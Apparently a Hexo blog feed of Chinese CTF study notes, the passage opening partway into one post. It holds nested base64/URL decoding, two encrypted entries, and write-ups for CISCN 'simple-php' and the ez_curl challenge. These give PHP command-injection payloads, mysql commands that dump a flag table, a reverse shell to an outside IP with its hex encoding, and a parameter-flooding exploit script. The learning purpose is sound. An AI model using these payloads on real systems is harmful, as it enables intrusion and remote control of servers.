class="line">VmpKMFUxTXhXWGxVV0dob1RUSjRVVll3V2t0aFJscDBZMGhLYTAxWGVIaFZiRkpUWWtaYVZWSnJXbFpOVjJoeVZYcEdZVkpzVG5KVWJHaHBWa1ZWZDFkV1ZtRmtNRFZYVjJ4c2FWSlVWbFJVVnpWdVRXeFZlV1ZHVGxSaVZrWTBXVlJPYzFWR1pFZFRiVGxYWW01Q1dGcEdXbE5UUjBZMlVXMTBWMWRGU2xkV1ZtUXdVekpGZUZOWWJHaFRSVFZWV1d0YVMxTXhjRVZUYTFwc1ZteHdlRlp0ZERCV01VcFlaRE53V0Zac2NIWldSekZMVW1zeFdWSnNTbWxXUjNodlZtMXdUMkl5Vm5OaVNGWnBVbXh3YzFac1VrZFNiRlY0WVVkMFZXSlZXbmxWYlRWUFZsWlplbEZyWkZSaVJrcFFWV3hGYkUwd1VXeE5NRkVsTTBRJTNE</span><br></pre></td></tr></table></figure><p>尝试base64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VjJ0U1MxWXlUWGhoTTJ4UVYwWkthRlp0Y0hKa01XeHhVbFJTYkZaVVJrWlZNV2hyVXpGYVJsTnJUbGhpVkVVd1dWVmFkMDVXV2xsaVJUVlRUVzVuTWxVeWVGTlRiVkY0WVROc1VGZEdTbTlXYm5CWFpGWlNTR0Y2UW10V1dFSldWVmQwUzJFeFNYbGhTRTVVWWtaS1MxcEVTa1psVmxweFZtdDBWMUpYZDNwWFZscHZWRzFLUmsxWVJsSmlWR3hvVm1wT2IyVnNiSFZpUmxwc1ZsUkdSbFV4YUd0VWJVWnlVbTVPVlZZelFrZFRiRkpQVWxFbE0wUWxNMFElM0Q%3D</span><br></pre></td></tr></table></figure><p>再次base64,无果，看到有%等符号，尝试 url解码后再次base64解码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WkRKV2Mxa3lPWFJhVmprd1lqRTRlVTFFU1hkS1ZFSkNXbTE0YUZwNVZYbE5SMng2U2xSSmQxa3lPWFJoVnpWdVRHazBkVXBVUWtKa1IyaHNTbFJKZDJFeVZqVktWRWwzWVZoTmJFMXFRbTlhVjNoellubFZlVTFFU1hkTmFrRnNUV3BGSlRORQ%3D%3D</span><br></pre></td></tr></table></figure><p>反复url解码，base64解码，最后得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">welcome_to_2020</span><br><span class="line">flag is coming...</span><br><span class="line">the key is hello 2020!</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>cs61a打卡学习笔记</title>
      <link href="/2024/05/29/cs61a%E6%89%93%E5%8D%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/05/29/cs61a%E6%89%93%E5%8D%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="29c0cacdf1b3041aeaed3138fd45e162319f6211b17152d5fcd601957ebc02e0">4630436162ade97ba2718b7d0c4b3b636ffdb9d3587769050f55768e578c9c6c703b9d83f53ed3eefbc7cc0e4225036fe9d13241edcb13f12dfaaa32ea9a1cbeb5c93627d8974a2dbd276cf99c3848dc6e643b675f446655433cb15c318e69308fcd6d25525bb31b4791b1ab5ebddcfe2ae3c86b9ae14401d95e8bbeeaefc93e5270ffea4ca074217e3dd7a81233d722d44989bf7c6d901cfaadde9360d17dc7f3bdcc2e3a6629aa53cbace59de5398095fa5a9d88983559efb83cf6f1ec6b0fa1d36981cc702cf0f59d8252097ba64946aea719d32a149fa4e4d41769800ac24d76a46593756a118c0aecbcbd2d952bc345f96f09c144a15e35c6ad192cd3240ba0fa3a917eb8028493dcd0301eaf79329e5d322b24c6790bf6fdb6563cb863520be1369771910366da4824808b5609ffdee2d5da62e37900ab2f283d58fdb0e32f9406359a1436a6d992a2ce16ec07b7d580f04a5af86bd072acf93302f841ba2ad7523795d05881b449f1369554521101d0eddb08dedd9844942009a0488ad638b61f339aee97e7f0c390192a82b23ab55d96a4d9cb1694e7c2375acdb4805dbd345d17b3059de487199a001d9f3597560ff7a636183f93cc402c12a664047509ac4b06aa1b4f732ff91931dbc736323f6dd9d86b207b91c3d841b8f3ae58cdd2b6e5a3e82da7b8258ca01737b3b483903bdaa10c5c72b50bd5f64ea44443557561084081538efeb6bd6eea0ec241382d220cb9a3dcbeb949f387d0a2bcd64140ceeb36797fb57f59acdd5c29b789c65e1d6c4c1de665a1a9268af7f53ebcdf3c08223a07c3711d09416f3c1ef13d2988f2c4ed54dd39349c90ef7150cde660904c9e7c04f98ca5511a2b536e0713225e78b5d4cc8a6b873b02e0a5a20c0300e55b51fd034d23a0f162c97e856ed2aee758bf5a6f8fd87fa6c44f07e017ce39875de0774595f5b9f4d9f22b9829515e6fd3f356c299d4f60b0b17fd1e4c8794a1382fe0501c90af197a7d70e22e7515e987477a6b7189e74b3224ff98a68130094c8a4dba77da6f77fc42e8f77a9c385226c65c2ed7cde911c94e0fcfb3ad447d980dd20f3d43a96bfd00928877206074842c70b86109fc5acd3d11251e02dc84706c44ca8be924392869b6bf7e9f3dca78e4987ea017ad4992fdb2c9fdfbaf6b23e0a3fe220a703766a4a70ab38b3afce580a34b69d54c03b5f83bd89490122342ef643a1a37ce86ae6226f6814e8f66579ff45ee1ee2a9e37df56eebdc1927052934d747e7d64e4b837adf106a1f850a17318c1ecc44a8a5c781ecc40a70d213ad7c2eb18c4ee2486290772fad46518485d16c1f2a244a9d3b757e755e43c26ad9df8607ad3dec5a728c8482480b490ae2a1b2ae2a7a8d48aa666a294067f243db3ca1a1fb212a21a986813f03bd2e7e73d62c9d71805ae3e6bbedb2ccf0768c80d97758ebd953db0a039804606a1f2581555659620bfd59c0ddaf54923e233dbfe6c29a57d3fda01837247fdc630017cda7ed73cd2da65725ae2abb6282c3841b11b42cc6eb027027cca3982f0fc37fb40f1564026ed17f94f702ead86b4c9b9b44d8b544c8c60e93e86074d1498bb6f11787c5313dd3d0a9f47548ff7ad6fca20f9b456612864638d54f18bc1369de51809689e388cd0963f6f4c45e1635baf848dc170d43db4051f4913c4df06322ae3611e4b3d3bf9809d0dc84bab7b0c4c3106945498c5ff91c7004ede5d719b5704ee94791a58416219e45665b8f10a2ad0a815eba2abe55008c76a14e34d845b18dbe83356489b76eb8ac02c4fa0e6f2dab280dd813f6b9891863eee1ba1339ee74e4f23486c2886b29dbd7a38a1777464c1e2a2202ac3c318f46e384c0c6b28913ed9409141ad9198dda292de8d8ecb51fb22a587c0db349c0f43a3606b419dc5fcbeed82f77959aa8c0f7d1a05aa0945770c68e1aeb42a4eac21aea95fb8da4a775599e2e50ae096d7ac842a7657d92c916de7c33f06d77b16895358d4bfc1271b12278f4975f19fd5780619692a104fabf687e4922cdade46df2d52be288ca5ca5da5a8e1b8e6e4f3d8d920d6d911c2e7f5ce9fc4ddcb50c80db7ba67240b1e161ce060d126a06b5d0b2cf5f357d6e6b8f556302e91c72127352381bba0b8459cac84fe738a0374b81c3a6c0c66e8db54aa7b00048eedc4954c45897786ccc1b117779ca672390b5f05b9e8294df1be945ff31ee828d4594352654e83f63ab3f1feec2c759766faa3def18d2b8ba93e5426ea9b1fb5a181518bdb841def1343b45bfad35eb593923eeeab14e7aa7f2815d3bdc41782652632f093dea253ecf6ae7b4d9281e6620236c76bedb1150f2320cc323aaa17398bd102f4ff1bc04fe63d8839c1ce814e650891cafcc72ffb9701a3512fd9625c52dbaa17ed073921eff6f649c17e8fac7731713a61db3fc1bd40fa4c3e8f7321bea78b463256ace54b47ea86f75a843513158ae3cc63e51a46435249ae0e0f103cd7784ff2a30e459ffe83287182c969ac97f76105e344eba1000437423ec2dc4b20eeb7a6cc9d5beea3f9c78dc4b78f93a0743786ad39b9dc851e67d198ddae3bf27e706a85aa3f69a3358bfa89595f8b9a52d07bb0ea6c6b9607784c03775db601171d1c9a2d81893d1949d5df8b0c44f1494573a485e424f5ae634782d320faef1ff9e9181145d9f09a821a2e91310be54cf16b4bad1a6a6833ca046946af2c13db84d3876eb698a4e9135b2c9a9c6db50970284c42d8c8ab4ef13bf4393db6648cf9c476cb7e2a04e58461234e90bf8ea4722f78ceb66f257f342bf16f86990467d9b40b947ffee2e84d00ed00080b81786791d24ce8d4b83ca68d29be5e65b9fcf294541b328936e39b4eefb6399a552024be48369d3174341866b996af64789183d8f48408b5054b0294775ef81a0a601de4a24b47a276ef1f4259f39390f4433a64000a27c1c2bcf767793268347f37f5c686034e1b01d842e2e85c7e66d34710640e1f641e09e3bfba1c22d23c5b317c1e</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>5.28记录</title>
      <link href="/2024/05/28/5-28%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/05/28/5-28%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="f68dff28cec4c6c8507e0b84cbdff5b431faaa61aa7a68627e70de2a09c37a1a">5eeca1580f39ade72a7db71e8e859a8768655ad5e9e43f4bfefde1bf7a30a9fa4542fb528377265da5af4d5968744cfc0a93aed5da08e0c2abaff9520cbb89813f4c2df61470729fbbe68c3231b622db4970e63807602ad3f50f8277f9342c0b8b1b5c81980fdddd89da453a4cf7bb2a55ca1f2ae870c2baf93a1d16f4ac5e1b08cd93bffa5b7375c17822b000bb36d77cc595e01976188735762c8b4ec73faa31048ad47e6d54c2158fd72ede438663348fae438a793cd0697177fa6a012296ea5f717e8211050915ec5c0f877ea75d609409def406c4003bf42725ca527aaf6569d1ba9538f0e5b11d914fe1053d481be83003b5b2ef1cfd3d71ff92532196538b184ad1486b9b19b8f4fdf57d840c88fc6b57f4b30dcfc12375015725dac845392a9a47dfbd23b57c3598c599e94699474ed2a37b57a69b6fec0bfd5e020324ef509d94cf762b9c400698ba4b16d7cbfd4380877f653a7e9196d12a431e286801aeaf91ad730491f11cb827cb74880b853cbb23f1002a5e13c6736c36f94ff0f3f0def155d941c8f514c1a8ef6f9ae6e57145f0474cba1b28cb65148b15ba76a329c8e66abc6580afa67a182a94170eb64934ee6e3484a1fc76e83dc5823925240b2eb5e75618d5e927be1d5dfcfd838558816bfeca4ddd6515e25d43691dd7062b7c3bb4ebd609339a052be0add94853b869398ab72895bc4337700d1d454277027e3b0d5ee4cbaf12a2b09ac9fb6e086ff1924aadd2d8ee1ce01a18fcac38d7bfc63f917e5bb24b4090f9728258d0d30b6453cb7d724c78c09421b7a21567ba4132416b386e361a02eefb5a1961092a06380208eeca0f1a277c85cc51f865f0dd896960d609c11dcf0cdfe46a6fae2202c740f0af3754454395c85c41e9cd4f74aad261bbaeaa5c503d2c0e17d467e02d5b1df2532afd13106a8aae4b490e4803d273c782d0ac1fbd45f6160c1f1d2fe1792414ad1d6d92db6d09c1ea7b09a3184b779bfa0fc6be1b990463d7a83a998d0380b69b493e895be6b28f2c5147a97870a00acbfcb9ab9e822faf1fcf68c4129d0d36a7511aeef583968bcb6b4c20a8db46ae1b3911bc6ff17cec39b8b0b9684a8d27026c296894c1cff47a0fd5f1b28cd75cbbca62cf0686324699275313d9cb43ee983de041986c7ac3cf3da7e8cd72d17d537843b3ab1c6b4f15d0498a93474b8387211e4f355c1c72beae0b8c9cefe090040d05bd6d761c0e9a96bd226815218c74c1dda17bce4f8969c236f0201f2392ee41f5515e902ba140a9b38af35211f7b32f4a4dadc85e81809ba1897142232e9cd265826378eaa377ee39f9b25ab05ebc7e3b2d64d0366a80dbd6abe14a561e6bced9f1c344f58f3ceb3c084cdad00cb69ee790c604d7b9b1dbd631d2876d1fdb1a7c39a4122ff82c4c59777c5ee51352b33fcbf7e7d93d6f96e4212492bf16f235bfb37d013edeb4e49118abe4e4c570c895f5c7bf96f70f2d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN复现</title>
      <link href="/2024/05/23/CISCN%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/05/23/CISCN%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>simple-php</p><p>法一：</p><p>payload:cmd &#x3D; php -r eval(hex2bin(substr(_73797374656d28276c7327293b,1)));</p><p>知识点：</p><p>要注意的点是：system(‘ls’);分号分号分号！！！！！！</p><p>在PHP中，变量名通常以字母或下划线开始，后面跟着字母、数字或下划线的任意组合。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.php -r   php -r eval()表示的是运行php代码，不用使用&lt;??&gt;这两个符号</span><br><span class="line">2.hex2bin(&#x27;dfvnjjb983utgnvjmkf&#x27;),将括号里的十六进制转为原始的二进制形式，即十六进制下对应的ascii码字符串</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">做题:</span><br><span class="line">1.尝试读取根目录下的flag,system(&#x27;ls&#x27;);,system(&#x27;cat /f*&#x27;) ,但是没有</span><br><span class="line">2.只能从数据库里面读取,echo:是一个Shell命令，用于输出文本或变量的值到标准输出（通常是屏幕）。反引号表示执行反引号内的命令</span><br><span class="line">echo `mysql -u root -p&#x27;root&#x27; -e &#x27;use PHP_CMS;show databases;&#x27;`;</span><br><span class="line">echo `mysql -u root -p&#x27;root&#x27; -e &#x27;use PHP_CMS;show tables;&#x27;`;</span><br><span class="line">echo `mysql -u root -p&#x27;root&#x27; -e &#x27;use PHP_CMS;select * from F1ag_Se3Re7;&#x27;`;</span><br><span class="line">注：在命令行中使用mysql命令时，-p选项后面紧接着应该是指定的密码，而且不应该有空格。这是因为-p后面直接跟的参数被认为是密码值，直到遇到下一个参数分隔符（通常是空格）为止。如果在-p和密码之间有空格，命令行解释器会认为-p后面没有紧跟密码，从而导致错误或误解密码的输入。</span><br></pre></td></tr></table></figure><p>法二：EOT代替分号，反弹shell，但是没成功🥹，版本问题吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cmd=php -r $a=&lt;&lt;&lt;EOT</span><br><span class="line">6c73</span><br><span class="line">EOT;</span><br><span class="line">eval(system(hex2bin($a)))</span><br></pre></td></tr></table></figure><p>16进制编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sock=fsockopen(&quot;47.121.25.95&quot;,3456);system(&quot;bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);</span><br><span class="line">24736f636b3d66736f636b6f70656e282234372e3132312e32352e3935222c33343536293b73797374656d282262617368203c2633203e263320323e263322293b</span><br></pre></td></tr></table></figure><p>fsockopen(“81.70.163.152”,82);</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这段代码使用fsockopen函数尝试与IP地址为   的服务器在端口  上建立一个Socket连接。fsockopen用于在 PHP中创建一个到其他服务器的网络连接，常用于发送数据或接收来自远程服务器的数据。如果连接成功，会返回文件指针（资源类型），在这里赋值给了变量$sock.</span><br></pre></td></tr></table></figure><p>system(“bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">利用system函数执行了一个shell命令，system函数用于执行外部程序，并且显示输出。这里的命令是启动一个Bash Shell,并进行了标准输入、输出、错误的重定向操作。</span><br><span class="line"></span><br><span class="line">- `&lt;&amp;3` 表示将标准输入（stdin，默认为0）重定向到文件描述符3指向的地方。在大多数情况下，如果之前的操作（如`fsockopen`）没有特别指定，文件描述符3默认不会被分配，但这里假设（基于上下文理解）它是对之前建立的socket连接的引用，意味着Bash将从这个socket接收输入。</span><br><span class="line">- `&gt;&amp;3` 是将标准输出（stdout，默认为1）重定向到文件描述符3，意味着Bash的所有正常输出也将通过这个socket发送出去。</span><br><span class="line">- `2&gt;&amp;3` 则是将标准错误输出（stderr，默认为2）同样重定向到文件描述符3，确保任何错误信息也通过相同的socket传递。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>web刷题</title>
      <link href="/2024/05/21/web%E5%88%B7%E9%A2%98/"/>
      <url>/2024/05/21/web%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h3 id="ez-curl"><a href="#ez-curl" class="headerlink" title="ez_curl"></a>ez_curl</h3><p>知识点：返回索引</p><ul><li><a href="https://www.runoob.com/php/func-string-strripos.html">strripos()</a> - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</li><li><a href="https://www.runoob.com/php/func-string-strpos.html">strpos()</a> - 查找字符串在另一字符串中第一次出现的位置（区分大小写）</li><li><a href="https://www.runoob.com/php/func-string-strrpos.html">strrpos()</a> - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</li></ul><p>考点：</p><p>1.express的parameterLimit默认为1000，即参数最大限制为1000，写脚本请求加上1000个参数就能成功把拼接的&amp;admin&#x3D;flase挤掉</p><p>2.这里根据RFC 7230(HTTP&#x2F;1.1协议的定义)的规定，规定了 field-name 是由一个或多个打印的 ASCII  字符组成，不包括分隔符，包括空格。因此，如果一个 field-name 的第一个字符是空格，那么这个 HTTP header  是非法的，应该被服务器或客户端忽略或拒绝，然而，Node.js 在处理这类情况时通常是宽容的。</p><p>3.当Content-Type为application&#x2F;x-www-form-urlencoded且提交方法是POST方法时，$_POST数据与php:&#x2F;&#x2F;input数据是一致的。</p><p>问题：挤掉&amp;admin&#x3D;false</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$offset = stripos($headers[$i], &#x27;:&#x27;);</span><br><span class="line">从头开始不分大小写,在headers的第一个参数找到冒号，返回冒号所在的位置,若未找到，返回False</span><br><span class="line">$key = substr($headers[$i], 0, $offset);</span><br><span class="line">在Headers的第一个参数中截取从0到冒号的值赋给$key  </span><br><span class="line">$value = substr($headers[$i], $offset + 1);</span><br><span class="line">在第一个参数中截取冒号到结尾的值赋给$value</span><br><span class="line">&#123;&quot;headers&quot;: [&quot;xx:xx\nadmin:true&quot;, &quot;Content-Type:application/json&quot;], &quot;params&quot;: &#123;&quot;admin&quot;: &quot;true&quot;, &quot;x0&quot;: 0&#125;</span><br><span class="line">比如它的$key就是xx,$value就是xx，因为\n换行符的原因，admin:true可以被绕过</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://61.147.171.105:49744/&#x27;</span></span><br><span class="line">datas = &#123;</span><br><span class="line">    <span class="string">&#x27;headers&#x27;</span> : [<span class="string">&#x27;xx:xx\n admin:true&#x27;</span>,<span class="string">&#x27;Content-Type: application/json&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;params&#x27;</span> : &#123;<span class="string">&#x27;admin&#x27;</span>:<span class="string">&#x27;true&#x27;</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1200</span>):  垃圾字符</span><br><span class="line">    datas[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;x&#x27;</span>+<span class="built_in">str</span>(i)] = i</span><br><span class="line"></span><br><span class="line">data = json.dumps(datas)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">r = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://back-end:3000/flag?&#x27;</span>;</span><br><span class="line"><span class="variable">$input</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);  </span><br><span class="line"><span class="variable">$headers</span> = (<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(<span class="variable">$input</span>)-&gt;headers;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$headers</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$offset</span> = <span class="title function_ invoke__">stripos</span>(<span class="variable">$headers</span>[<span class="variable">$i</span>], <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$headers</span>[<span class="variable">$i</span>], <span class="number">0</span>, <span class="variable">$offset</span>);</span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$headers</span>[<span class="variable">$i</span>], <span class="variable">$offset</span> + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$key</span>, <span class="string">&#x27;admin&#x27;</span>) &gt; -<span class="number">1</span> &amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$value</span>, <span class="string">&#x27;true&#x27;</span>) &gt; -<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;try hard&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$params</span> = (<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(<span class="variable">$input</span>)-&gt;params;</span><br><span class="line"><span class="variable">$url</span> .= <span class="title function_ invoke__">http_build_query</span>(<span class="variable">$params</span>);</span><br><span class="line"><span class="variable">$url</span> .= <span class="string">&#x27;&amp;admin=false&#x27;</span>;</span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="variable">$headers</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_TIMEOUT_MS, <span class="number">5000</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_NOBODY, <span class="literal">FALSE</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="keyword">try</span> hard1</span><br><span class="line"></span><br><span class="line">js代码</span><br><span class="line">app.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/flag&#x27;</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.query.admin.<span class="title function_ invoke__">includes</span>(<span class="string">&#x27;false&#x27;</span>) &amp;&amp; req.headers.admin.<span class="title function_ invoke__">includes</span>(<span class="string">&#x27;true&#x27;</span>))&#123;</span><br><span class="line">        res.<span class="title function_ invoke__">send</span>(flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_ invoke__">send</span>(<span class="string">&#x27;try hard&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="wife-wife"><a href="#wife-wife" class="headerlink" title="wife_wife"></a>wife_wife</h3><p>前置知识：</p><p>假设在函数内部新建了一个变量，函数执行完毕之后，函数内部这个独立作用域或（封闭的盒子）就会删除，此时这个新建变量也会被删除。</p><p>如何令这个封闭的盒子是不会删除？可以使用“闭包”的方法（闭包涉及函数作用域、内存回收机制、作用域继承）</p><p>闭包后，内部函数可以访问外部函数作用域的变量，而外部的函数不能直接获取到内部函数的作用域变量</p><p>js闭包理解：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> add = (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> counter = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;<span class="keyword">return</span> counter += <span class="number">1</span>;&#125;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 奶奶的“记忆助手”  </span></span><br><span class="line"><span class="keyword">var</span> 奶奶的记忆助手 = (<span class="keyword">function</span>(<span class="params"></span>) &#123;  </span><br><span class="line">    <span class="comment">// 初始时，奶奶还没有收集任何石头  </span></span><br><span class="line">    <span class="keyword">var</span> 奶奶已经收集的石头数量 = <span class="number">0</span>;  </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这是一个按钮，奶奶每次找到一块石头都会按这个按钮  </span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;  </span><br><span class="line">        <span class="comment">// 每按一次，奶奶已经收集的石头数量就加1  </span></span><br><span class="line">        奶奶已经收集的石头数量 += <span class="number">1</span>; </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 然后告诉奶奶她现在有多少块石头  </span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> 奶奶已经收集的石头数量;  </span><br><span class="line">    &#125;;  </span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识re</title>
      <link href="/2024/05/20/%E5%88%9D%E8%AF%86re/"/>
      <url>/2024/05/20/%E5%88%9D%E8%AF%86re/</url>
      
